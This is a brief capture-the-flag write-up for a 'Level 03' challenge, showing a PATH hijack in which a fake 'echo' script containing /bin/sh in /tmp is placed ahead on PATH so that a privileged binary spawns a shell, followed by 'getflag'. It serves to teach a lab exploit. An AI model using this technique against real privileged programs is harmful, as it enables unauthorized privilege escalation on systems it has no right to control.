# Level 03

Nice PATH hijack level.

The binary eventually does:

```c
system("/usr/bin/env echo Exploit me");
```

Because it uses env + command name, we can fake echo.

```bash
echo '/bin/sh' > /tmp/echo
chmod +x /tmp/echo
PATH=/tmp/:$PATH ./level03
```

Now you are in a better shell context, so:

```bash
getflag
```

Vulnerability: privileged command execution with PATH control.
